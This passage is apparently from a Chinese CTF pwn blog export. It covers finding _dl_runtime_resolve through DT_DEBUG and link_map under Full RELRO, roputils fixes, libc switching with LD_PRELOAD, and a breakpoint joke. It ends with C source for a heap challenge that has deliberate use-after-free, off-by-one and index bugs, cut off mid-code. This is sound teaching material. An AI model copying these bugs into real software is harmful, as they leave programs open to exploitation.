<p>ps:关于超时的那个报错当时还好好研究了一会儿来着。就是一个sigxxx，sigalarm好像，然后默认返回中止程序。</p>
<p>解决方案也比较弱智。就是直接patch掉就好了。</p>
<p>ida都关了懒得上图了。</p>
]]></content>
      <tags>
        <tag>mess</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2dl_advanced</title>
    <url>/2021/08/02/ret2dl_advanced/</url>
    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="ret2dl-advanced"><a href="#ret2dl-advanced" class="headerlink" title="ret2dl_advanced"></a>ret2dl_advanced</h2><h3 id="1-review"><a href="#1-review" class="headerlink" title="1)review"></a>1)review</h3><p>当FULL RELRO保护开启时，通过 <code>dl_run_time</code>来获取libc基址的方式几乎无解。</p>
<p>但是我们仍然能够找到某种方式来getshell。</p>
<p>相关论文中给出一种解决方案，即通过<code>dt_bug</code>入口找到突破点。</p>
<p>(Ps:为什么找不到相关的中文文章)</p>
<h3 id="2）dt-dbg？"><a href="#2）dt-dbg？" class="headerlink" title="2）dt_dbg？"></a>2）dt_dbg？</h3><p><code>dt_dbg</code>这个概念实际上并不新鲜，简单来说它可以被包含在<code>libc.so</code>文件中，比如我们指定一个特定的libc版本加载的时候，通常除了程序本体还要附加一个libc文件，有时我们的debug信息就包含在这个<code>libc.so</code>文件中。但是有的libc.so文件是不包含debug信息的。所以如果我们程序的libc没有dbg文件那这个方法也没用了。</p>
<p><code>dt_dubug</code>用于指向<code>type_r_debug</code>这个结构体。这个结构体用来保存调试器需要的信息来确认动态装载器的基址和拦截一些特定的与动态装载相关的事件。</p>
<p>此外，这个结构体的<code>r_map</code>域保存了指向<code>link_map</code>的链接表表头的指针。</p>
<p>也就是<code>dt_dbg</code>指向<code>type_r_debug</code>，且<code>type_r_debug</code>维护了指向<code>link_map</code>的指针。</p>
<p><code>r_debug</code>具体代码如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Rendezvous structure used by the run-time dynamic linker to communicate details of shared object loading to the debugger. If the executable&#x27;s dynamic section has a DT_DEBUG element, the run-time linker sets that element&#x27;s value to the address where this structure can be found. */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">r_debug</span></span><br><span class="hljs-class">  &#123;</span> <br>    <span class="hljs-keyword">int</span> r_version;              <span class="hljs-comment">/* Version number for this protocol. */</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">r_map</span>;</span>     <span class="hljs-comment">/* Head of the chain of loaded objects. */</span><br><br>    <span class="hljs-comment">/* This is the address of a function internal to the run-time linker, that will always be called when the linker begins to map in a library or unmap it, and again when the mapping change is complete. The debugger can set a breakpoint at this address if it wants to notice shared object mapping changes. */</span><br>    ElfW(Addr) r_brk;<br>    <span class="hljs-class"><span class="hljs-keyword">enum</span></span><br><span class="hljs-class">      &#123;</span> <br>        <span class="hljs-comment">/* This state value describes the mapping change taking place when the `r_brk&#x27; address is called. */</span><br>        RT_CONSISTENT,          <span class="hljs-comment">/* Mapping change is complete. */</span><br>        RT_ADD,                 <span class="hljs-comment">/* Beginning to add a new object. */</span><br>        RT_DELETE               <span class="hljs-comment">/* Beginning to remove an object mapping. */</span><br>      &#125; r_state;<br><br>    ElfW(Addr) r_ldbase;        <span class="hljs-comment">/* Base address the linker is loaded at. */</span><br>  &#125;;<br></code></pre></td></tr></table></figure>

<p>实操一遍</p>
<p>随便写一个无output的栈溢出。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">fur1n@ubuntu:~/pwn$ readelf -d ret2dl<br><br>Dynamic section at offset 0xdb8 contains 27 entries:<br>  Tag        Type                         Name/Value<br>...<br> 0x0000000000000015 (DEBUG)              0x0<br><br><br></code></pre></td></tr></table></figure>

<p>在没有运行的时候<code>dt_dbg</code>为空。</p>
<p>在关闭aslr的情况下找到<code>dt_debug</code>并不困难。</p>
<p>gdb使用<code>elfheader</code>命令查看相关elfheader的地址，可以找到<code>.dynamic</code></p>
<p>段的地址。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pwndbg&gt; x/50gx 0x600e20<br>...<br>0x600ee0:	0x0000000000000015	0x00007ffff7ffe140<br></code></pre></td></tr></table></figure>

<p>0x00007ffff7ffe140也就是<code>dt_debug</code>指向的<code>r_debug</code>的地址。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pwndbg&gt; x/20gx 0x00007ffff7ffe140<br>0x7ffff7ffe140 &lt;_r_debug&gt;:	0x0000000000000001	0x00007ffff7ffe170<br>0x7ffff7ffe150 &lt;_r_debug+16&gt;:	0x00007ffff7de3f40	0x0000000000000000<br>0x7ffff7ffe160 &lt;_r_debug+32&gt;:	0x00007ffff7dd3000	0x0000000000000000<br>0x7ffff7ffe170:	0x0000000000000000	0x00007ffff7ffe700<br>0x7ffff7ffe180:	0x0000000000600e20	0x00007ffff7ffe710<br>0x7ffff7ffe190:	0x0000000000000000	0x00007ffff7ffe170<br>0x7ffff7ffe1a0:	0x0000000000000000	0x00007ffff7ffe6e8<br>0x7ffff7ffe1b0:	0x0000000000000000	0x0000000000600e20<br>0x7ffff7ffe1c0:	0x0000000000600f00	0x0000000000600ef0<br>0x7ffff7ffe1d0:	0x0000000000000000	0x0000000000600ea0<br><br></code></pre></td></tr></table></figure>

<p><code>r_debug</code>维护的第一个结构体，也就是<code>link_map</code>地址，即<code>0x00007ffff7ffe170</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">0x7ffff7ffe140 &lt;_r_debug&gt;:	0x0000000000000001	0x00007ffff7ffe170<br></code></pre></td></tr></table></figure>

<p>这样我们就从<code>dt_debug</code>找到了<code>link_map</code>的地址。</p>
<p>虽然但是。</p>
<p>只是找到<code>link_map</code>没啥用。</p>
<p>我们的最终目的还是寻找到<code>dl_runtime_resolve</code>函数的地址，当地址被找到那么之后的操作就是常规的ret2dl了。</p>
<p>能从动态链接库中找到<code>dl_runtime_resolve</code>函数地址的原理大致是Full RELRO保护只对main excutable生效，而动态链接库并不受它保护。这就意味着我们如果能够通过动态链接库来找到<code>dl_runtime_resolve</code>函数地址，那么问题就迎刃而解了。</p>
<p>那么如何寻找呢？</p>
<p>实际比较简单（无aslr的情况），只要根据<code>link_map</code>的结构依次顺下来就好了。</p>
<p>上一个section我们找到了<code>link_map</code>的地址，接下来我们通过<code>link_map</code>逐步找到</p>
<p><code>dl_runtime_resolve</code>。</p>
<p>首先我们找到<code>libc.so.6</code>文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pwndbg&gt; x/20gx 0x00007ffff7ffe170<br>0x7ffff7ffe170:	0x0000000000000000	0x00007ffff7ffe700<br>0x7ffff7ffe180:	0x0000000000600e20	0x00007ffff7ffe710<br>---<br>pwndbg&gt; x/20gx 0x00007ffff7ffe700<br>0x7ffff7ffe700:	0x0000000000000000	0x0000000000000000<br>0x7ffff7ffe710:	0x00007ffff7ffb000	0x00007ffff7ffebb0<br>---<br>pwndbg&gt; x/s 0x00007ffff7ffebb0<br>0x7ffff7ffebb0:	<span class="hljs-string">&quot;linux-vdso.so.1&quot;</span><br>---<br>pwndbg&gt; x/10gx 0x00007ffff7ffe710<br>0x7ffff7ffe710:	0x00007ffff7ffb000	0x00007ffff7ffebb0<br>0x7ffff7ffe720:	0x00007ffff7ffb3a0	0x00007ffff7fe2000<br>---<br>pwndbg&gt; x/10gx 0x00007ffff7fe2000<br>0x7ffff7fe2000:	0x00007ffff79e2000	0x00007ffff7ffedd0<br>---<br>pwndbg&gt; x/s 0x00007ffff7ffedd0<br>0x7ffff7ffedd0:	<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br><br></code></pre></td></tr></table></figure>

<p>即<code>0x00007ffff7ffedd0</code>。</p>
<p>0x3即<code>GOT[]</code>入口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pwndbg&gt; x/30gx 0x00007ffff7dccb80<br>...<br>0x7ffff7dccc30:	0x0000000000000003	0x00007ffff7dcd000<br><br></code></pre></td></tr></table></figure>

<p>找到GOT[3]</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pwndbg&gt; x/5gx 0x00007ffff7dcd000<br>0x7ffff7dcd000:	0x00000000003eab80	0x00007ffff7fe2000<br>0x7ffff7dcd010:	0x00007ffff7dea8f0	0x00007ffff7b70a10<br></code></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pwndbg&gt; xinfo 0x00007ffff7dea8f0<br>Extended information <span class="hljs-keyword">for</span> virtual address 0x7ffff7dea8f0:<br><br>  Containing mapping:<br>    0x7ffff7dd3000     0x7ffff7dfc000 r-xp    29000 0      /lib/x86_64-linux-gnu/ld-2.27.so<br><br>  Offset information:<br>         Mapped Area 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0<br>         File (Base) 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0<br>      File (Segment) 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0<br>         File (Disk) 0x7ffff7dea8f0 = /lib/x86_64-linux-gnu/ld-2.27.so + 0x178f0<br><br> Containing ELF sections:<br>               .text 0x7ffff7dea8f0 = 0x7ffff7dd3f10 + 0x169e0<br><br></code></pre></td></tr></table></figure>

<h3 id="3）exploitation"><a href="#3）exploitation" class="headerlink" title="3）exploitation"></a>3）exploitation</h3><p>在无aslr并已经获取到<code>dl_runtime_resolve</code>的情况下的利用和patial relro相似。</p>
<p>有aslr的情况。。</p>
<p>我也不会。</p>
<h3 id="4-refrence"><a href="#4-refrence" class="headerlink" title="4)refrence"></a>4)refrence</h3><p><a href="http://rk700.github.io/2015/04/09/dt_debug-read/">通过DT_DEBUG来获得各个库的基址</a></p>
<p><a href="https://www.usenix.org/conference/usenixsecurity15/technical-sessions/presentation/di-frederico">How the ELF Ruined Christmas</a></p>
<p><a href="https://ypl.coffee/dl-resolve-full-relro/">Finding link_map and _dl_runtime_resolve() under full RELRO</a></p>
<p>————————————————tbc——————————————————-</p>
]]></content>
      <tags>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title>roputils使用tips</title>
    <url>/2021/08/03/roputils/</url>
    <content><![CDATA[<p>做ret2dl的时候难免会偷懒使用工具。</p>
<p>但是这个工具并没有看起来那么和善。</p>
<p>就怎么使用utils包我都研究了一会儿，然后发现只需要<code>import roputils</code>然后把相对应的那个py脚本放到同一路径下就好。</p>
<p>但是紧接着第二问个问题，这个py脚本通篇是python2，而我日常无论哪个系统都是py3。</p>
<p>所以解决方式有2</p>
<ol>
<li> 将roputils转换为py3</li>
<li>ubuntu切换py版本</li>
</ol>
<p>反正第一种就是用一个叫2to3的脚本。是py2自带的，使用需要先安装py2.7，我ubuntu18.04自带py2.7，所以就直接<code>2to3 -w roputils.py</code></p>
<p>具体参数可以google。</p>
<p>然后又来了第三个问题。</p>
<p>来看我的报错。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">[+] Starting local process <span class="hljs-string">&#x27;./babystack&#x27;</span>: pid <span class="hljs-number">745</span><br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;babystack.py&quot;</span>, line <span class="hljs-number">23</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    rop = roputils.ROP(<span class="hljs-string">&#x27;./babystack&#x27;</span>)<br>  File <span class="hljs-string">&quot;/home/fur1n/pwn/week1/roputils.py&quot;</span>, line <span class="hljs-number">440</span>, <span class="hljs-keyword">in</span> __init__<br>    ELF.__init__(self, *args, **kwargs)<br>  File <span class="hljs-string">&quot;/home/fur1n/pwn/week1/roputils.py&quot;</span>, line <span class="hljs-number">85</span>, <span class="hljs-keyword">in</span> __init__<br>    m = re.search(<span class="hljs-string">r&#x27;^\s*(?P&lt;key&gt;[^:]+):\s+(?P&lt;value&gt;.+)$&#x27;</span>, line)<br>  File <span class="hljs-string">&quot;/usr/lib/python3.6/re.py&quot;</span>, line <span class="hljs-number">182</span>, <span class="hljs-keyword">in</span> search<br>    <span class="hljs-keyword">return</span> _<span class="hljs-built_in">compile</span>(pattern, flags).search(string)<br>TypeError: cannot use a string pattern on a <span class="hljs-built_in">bytes</span>-like <span class="hljs-built_in">object</span><br></code></pre></td></tr></table></figure>

<p>这个功能好像并不会在byte前加b。。。</p>
<p>目前来说并没有发现解决方法。</p>
<p>所以只能尝试更换默认的py版本。具体可以google</p>
]]></content>
      <tags>
        <tag>mess</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu加载不同版本libc</title>
    <url>/2021/08/17/ubuntu%E5%8A%A0%E8%BD%BD%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AClibc/</url>
    <content><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h4 id="1）review"><a href="#1）review" class="headerlink" title="1）review"></a>1）review</h4><p> 这个问题困扰了我多年，之前年轻的时候不知道为什么有的是题我就是死活调不出，后来才知道呀原来用的ubunt的版本太高了。但是我一直忽视了这个问题以为并不是什么关键的因素。我是这么认为的–只要清楚了利用方法并记住对应的libc版本，无论是不是真的把这道题调试出来了都无所谓。</p>
<p>然后我就是这样一步一步地变得不会调试的。</p>
<p>但是完整地把一道题调出来。这才是关键。这才是pwn题的灵魂。</p>
<p>呜呜呜，我居然一直忽略了它的灵魂</p>
<p>所以这一次我一定要解决掉这个问题。</p>
<p>之前做考核的时候，稍微研究过这个问题。但是因为下载的的libc并没有debug符号，最终还是放弃了。</p>
<p>目前来说针对题目的调试，一般来说是本地，远程也不用考虑这个问题。</p>
<h4 id="2）原理"><a href="#2）原理" class="headerlink" title="2）原理"></a>2）原理</h4><p>在这之前我们需要了解一下ld以及libc在动态链接中的具体作用。实际上这也是一个比较基础的概念，ld链接器，libc共享库没什么好说的。</p>
<p>但是这里有一堆环境变量就很离谱。我们来依次列举一下并且搞清楚它们是做什么的。</p>
<h5 id="1）LD-PRELOAD"><a href="#1）LD-PRELOAD" class="headerlink" title="1）LD_PRELOAD"></a>1）LD_PRELOAD</h5><p>首先就是我们在脚本前加载的<code>LD_PRELOAD</code>这个东西。一般的用法是<code>env=&#123;&quot;LD_PRELOAD&quot;:libc_path&#125;</code></p>
<p>它可以影响程序的运行时的链接（Runtime linker），允许你定义在程序运行前优先加载的动态链接库。</p>
<p>这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。</p>
<p>换句话说我们可以通过指定这个环境变量来指定特定的libc版本。</p>
<h5 id="2）LD-LIBRARY-PATH和LIBRARY-PATH"><a href="#2）LD-LIBRARY-PATH和LIBRARY-PATH" class="headerlink" title="2）LD_LIBRARY_PATH和LIBRARY_PATH"></a>2）LD_LIBRARY_PATH和LIBRARY_PATH</h5><p>LD_LIBRARY_PATH用于在<em><strong>程序加载运行期间</strong></em>查找动态链接库时指定除了系统默认路径之外的其他路径.</p>
<p>LIBRARY_PATH环境变量用于在<em><strong>程序编译期间</strong></em>查找动态链接库时指定查找共享库的路径</p>
<p>其实可以发现这三个环境变量都是修改程序需要的共享库，但是生效的时间不一样。</p>
<p>并且在pwn题中基本都是需要在运行前指定另外的共享库的，所以<code>LD_PRELOAD</code>还是比较常见。</p>
<p>相关（？）环境变量大概就这么多，然后是某些特殊的段。</p>
<h5 id="1）-PT-INTERP"><a href="#1）-PT-INTERP" class="headerlink" title="1） PT_INTERP"></a>1） PT_INTERP</h5><p>储存了程序使用的ld.so的路径，默认使用 /lib64/ld-linux-x86-64.so.2。</p>
<p>我们可以修改这个段的内容来指定我们需要的链接器。</p>
<h4 id="汇总"><a href="#汇总" class="headerlink" title="汇总"></a>汇总</h4><p>综上，我们首先要准备我们需要的libc和ld，libc可以是编译好的elf文件也可以通过源码自己编译，这个无所谓。ld文件比较诡异，似乎是一个ld能同时支持很多libc的小版本。并不是一对一的关系。</p>
<p>准备好了以后我们通过脚本将题目<code>PT_INTERP</code>段修改，然后通过<code>LD_PRELOAD</code>指定我们需要的libc的路径即可。</p>
<h4 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h4><p>我们以lonelywolf为例。</p>
<p>有一个很尴尬的事实就是，我找不到比赛提供的libc了。当时存了，但是没有了。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/net66/p/5609026.html"><a href="https://www.cnblogs.com/net66/p/5609026.html">LD_PRELOAD的偷梁换柱之能</a></a></p>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>调试器断点原理</title>
    <url>/2021/08/10/%E8%B0%83%E8%AF%95%E5%99%A8%E6%96%AD%E7%82%B9%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<h2 id="1-review"><a href="#1-review" class="headerlink" title="1)review"></a>1)review</h2><p>夹带私货的科普文</p>
<h3 id="2）调试器断点"><a href="#2）调试器断点" class="headerlink" title="2）调试器断点"></a>2）调试器断点</h3><p>　　调试器可以给程序打断点是怎么回事呢？调试器相信大家都很熟悉，但是调试器可以给程序打断点是怎么回事呢，下面就让小编带大家一起了解吧。<br>　　调试器可以给程序打断点，其实就是程序以为自己出错了，大家可能会很惊讶程序怎么可能以为自己会出错呢？但事实就是这样，小编也感到非常惊讶。<br>　　这就是关于调试器可以给程序打断点的事情了，大家有什么想法呢，欢迎在评论区告诉小编一起讨论哦！</p>
]]></content>
      <tags>
        <tag>mess</tag>
      </tags>
  </entry>
  <entry>
    <title>SummerTask</title>
    <url>/2021/08/02/summertask/</url>
    <content><![CDATA[<h1 id="1）Summer-Havard"><a href="#1）Summer-Havard" class="headerlink" title="1）Summer_Havard"></a>1）Summer_Havard</h1><h2 id="1-考点"><a href="#1-考点" class="headerlink" title="1) 考点"></a>1) 考点</h2><p>unlink</p>
<p>chunk overlapping</p>
<p>off by one/null</p>
<h2 id="2）源码"><a href="#2）源码" class="headerlink" title="2）源码"></a>2）源码</h2><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_IDX 100<span class="hljs-comment">//the maximum number of songs which can be created</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_SIZE 9999<span class="hljs-comment">//the maximum size of your chunk</span></span><br><span class="hljs-comment">//#define MAGICAL_IDX rand()%1000 // MAGICAL_IDX is a randow number in range of 0 - 1000.</span><br><span class="hljs-comment">//#define MAGICAL_IDX 2 // MAGICAL_IDX is a randow number in range of 0 - 1000.</span><br><br><span class="hljs-comment">//int MAGIC_NAME =  831;//the name of the target song to getshell</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">song</span> // <span class="hljs-title">create</span> <span class="hljs-title">the</span> <span class="hljs-keyword">struct</span> <span class="hljs-title">of</span> <span class="hljs-title">song</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">char</span> *name; <span class="hljs-comment">//the name of the song</span><br>  <span class="hljs-keyword">size_t</span> size;<span class="hljs-comment">//the size of the song</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">song</span> *<span class="hljs-title">songlist</span>[<span class="hljs-title">MAX_IDX</span>];</span><span class="hljs-comment">//set the max number of the songs</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">menu</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|----------------------------|&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|         MY_PLAYER          |&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|----------------------------|&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|1.DOWNLOAD THE SONG         |&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|2.DELETE THE SONG           |&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|3.LISTENING                 |&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|4.EDIT THE NAME OF THE SONG |&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|5.EXIT                      |&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|6.PWNED                     |&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|----------------------------|&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|            ∧ ___ ∧         |&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|           / ●   ● |        |&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|          /    -   |        |&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|----------------------------|&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">download</span><span class="hljs-params">()</span> <span class="hljs-comment">//add a new heap includeing a size chunk and content chunk.</span></span><br><span class="hljs-function"></span>&#123; <span class="hljs-keyword">int</span> i;<br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">8</span>];<span class="hljs-comment">//the buffer of the read func .</span><br>  <span class="hljs-keyword">size_t</span> size;<span class="hljs-comment">//the size of the chunk.</span><br>  <span class="hljs-keyword">if</span> (MAX_IDX &gt; <span class="hljs-number">100</span>) <span class="hljs-comment">//set the range .</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot; MEMORY EXCESSIVE LOAD &quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAX_IDX; i++)<span class="hljs-comment">//init the struct heap.</span><br>  &#123;<br>    <span class="hljs-keyword">if</span> (!songlist[i]) <br>    &#123;<br>      songlist[i] = (struct song *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(struct song));<br>      <span class="hljs-keyword">if</span> (!songlist[i])<br>       &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;ALLOCA ERROR&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>       &#125; <span class="hljs-comment">//error</span><br>  <br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SIZE OF THE SONG :&quot;</span>);<br>      <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%ld&quot;</span>,&amp;size);<br>      <span class="hljs-keyword">if</span> (size &gt; <span class="hljs-number">0</span> &amp;&amp; size &lt; MAX_SIZE)<br>      &#123;<br>        songlist[i]-&gt;name = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(size);<span class="hljs-comment">//add a chunk to store the struct &#x27;size&#x27; .</span><br>      <span class="hljs-keyword">if</span> (!songlist[i]-&gt;name) <br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;ALLOCA ERROR&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>      &#125;<span class="hljs-comment">//error</span><br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NAME :&quot;</span>);<br>      read(<span class="hljs-number">0</span>,songlist[i]-&gt;name,size);<br>      <span class="hljs-comment">//scanf(&quot;%c&quot;,&amp;(songlist[i]-&gt;name));</span><br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;DOWNLOAD SUCCESFULLY&quot;</span>);<br>      <span class="hljs-keyword">break</span>;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(INVALID SIZE)\n&quot;</span> );<br>        <span class="hljs-keyword">break</span>;<br>      &#125;<br>      <br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">delete</span><span class="hljs-params">()</span><span class="hljs-comment">//delete</span></span><br><span class="hljs-function"></span>&#123; <br>  <span class="hljs-keyword">int</span> idx;<br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">4</span>];<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;INDEX :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4</span>);<br>  idx = atoi(buf);<br>  <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> || idx &gt;= <span class="hljs-number">100</span>) <br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;INVALID INDEX!!!&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (songlist[idx]) <br>  &#123;<br>    <span class="hljs-built_in">free</span>(songlist[idx]-&gt;name);<br>    <span class="hljs-built_in">free</span>(songlist[idx]);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;DELETE SUCCESFULLY&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;THE SONG DOESN&#x27;T EXIST!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">listen</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123; <br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">4</span>];<br>  <span class="hljs-keyword">int</span> idx;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;INDEX :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4</span>);<br>  idx = atoi(buf);<br>  <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> || idx &gt; <span class="hljs-number">100</span>) <br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;INVALID INDEX!!!&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (songlist[idx])<br>  &#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;YOU ARE LINTENING TO %s &quot;</span>,songlist[idx]-&gt;name);<br>  &#125;  <br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;THE SONG DOESN&#x27;T EXIST!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">edit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123; <br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">8</span>];<br>  <span class="hljs-keyword">int</span> idx;<br>  <span class="hljs-keyword">size_t</span> size;<br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;NOW YOU CAN CHANGE YOUR SONG&#x27;S NAME!!&quot;</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;INDEX OF YOUR TERGGER SONG: &quot;</span>);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;idx);<br>  <span class="hljs-keyword">if</span>(idx &lt; <span class="hljs-number">0</span> || idx &gt; <span class="hljs-number">100</span>)<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;INVALID INDEX!!!&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SIZE OF THE SONG :&quot;</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8</span>);<br>    size = atoi(buf);<br>    songlist[idx]-&gt;name = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(size);<span class="hljs-comment">//add a chunk to store the struct &#x27;size&#x27; .</span><br>    <span class="hljs-keyword">if</span> (!songlist[idx]-&gt;name) <br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;ALLOCA ERROR&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<span class="hljs-comment">//error</span><br>    <span class="hljs-keyword">if</span> (songlist[idx]) <br>    &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;CHANGE YOUR SONG NAME NOW :&quot;</span>);<br>    read(<span class="hljs-number">0</span>,songlist[idx]-&gt;name,size+<span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EDIT SUCCESFULLY&quot;</span>); <br>    &#125; <br>    <span 